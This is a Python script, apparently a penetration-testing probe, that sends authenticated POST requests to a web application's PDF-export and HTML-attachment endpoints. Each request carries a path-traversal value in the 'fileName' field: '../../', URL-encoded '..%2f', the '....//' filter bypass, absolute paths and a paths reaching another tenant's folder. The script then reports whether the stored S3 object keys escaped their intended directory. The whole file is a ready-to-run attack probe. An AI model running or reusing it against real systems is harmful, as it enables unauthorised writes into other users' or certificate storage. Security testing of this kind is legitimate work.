import json,subprocess,os,uuid
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def post(path,body):
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:8]
print("=== document_intelligence/export/pdf : fileName traversal ===")
for fn in [f"zx-{tag}",
           "../../demo-certs-dkim_demo/zx-trav",
           "..%2f..%2fdemo-certs-dkim_demo%2fzx-t2",
           "....//demo-certs-dkim_demo/zx-t3",
           "/demo-certs-dkim_demo/zx-abs",
           "shqa-playwright14991/demo/test/zx-t4"]:
    c,b=post('/api/v1/document_intelligence/export/pdf',
             {"htmlContent":"<p>ZX</p>","fileName":fn})
    key=''
    try:
        u=json.loads(b).get('url') or ''
        key=u.split('.amazonaws.com/')[1].split('?')[0] if '.amazonaws.com/' in u else u[:120]
    except: key=b[:100]
    print(f"  {fn[:42]:44} -> {c}  key={key[:110]}")
print()
print("=== attachments/html : fileName traversal (word) ===")
for fn in [f"zx-{tag}w","../../demo-certs-dkim_demo/zx-wtrav","....//demo-certs-dkim_demo/zx-wt2"]:
    c,b=post('/api/v1/attachments/html',
             {"html":"<p>ZX</p>","type":"word","attachableType":"AuditableEntity",
              "attachableId":"95","fileName":fn})
    print(f"  {fn[:42]:44} -> {c} {b[:150].replace(chr(10),' ')}")
